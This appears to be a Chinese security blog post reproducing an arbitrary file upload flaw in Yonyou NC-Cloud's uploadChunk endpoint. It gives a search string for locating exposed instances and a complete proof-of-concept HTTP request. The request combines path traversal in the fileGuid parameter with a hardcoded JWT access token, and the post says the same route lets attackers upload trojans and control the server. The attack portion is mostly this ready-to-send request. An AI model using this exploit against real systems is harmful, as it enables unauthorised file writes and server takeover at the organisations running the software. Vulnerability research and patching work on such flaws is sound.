#  【漏洞复现】用友NC-Cloud系统uploadChunk存在任意文件上传漏洞   
猴子  花果山讲安全   2024-02-12 11:21  
  
- 0x01 阅读须知  
  
**花果山的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
- 0x02 产品介绍  
  
用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平。  
- 0x03 漏洞描述  
  
用友NC Cloud uploadChunk文件存在任意文件上传漏洞，攻击者通过此漏洞可实现上传木马文件，控制服务器。  
- 0x04 漏洞影响  
  
未知  
  
- 0x05 复现环境  
  
app="用友-NC-Cloud"  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVibC1WZPq1olTlnNLwTULI3Lic5mq9VxrQKiciaYSM2cgFaia9UHK7Fqtz8jdiaibKfUN0lWf2fqNicxSpAMQ/640?wx_fmt=png&from=appmsg "")  
- 0x06 漏洞复现  
  
POC如下：  
```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
Content-Length: 148
Content-Type: multipart/form-data; boundary=de7a6692c03f903d173515933ee6f161

--de7a6692c03f903d173515933ee6f161
Content-Disposition: form-data; name="file"; filename="test.txt"

test
--de7a6692c03f903d173515933ee6f161--
```  
  
poc中存在一个请求头：accessTokenNcc，该请求头为JWT，详情请点击原文查看。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVibC1WZPq1olTlnNLwTULI3LcvhJ8vfQbH6VuwEtaW6icuw6CZnZZp0SkciblbctZ5gO3cyEuFpXJY6w/640?wx_fmt=png&from=appmsg "")  
  
返回操作成功即证明上传成功，访问test.txt确认。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVibC1WZPq1olTlnNLwTULI3Lm59oWWNE5DWd69bqcAcv79kAWkXc5CicIz6LRoGNqpeq1p4b8eW8TLw/640?wx_fmt=png&from=appmsg "")  
  
上传成功，至此漏洞复现结束。  
  
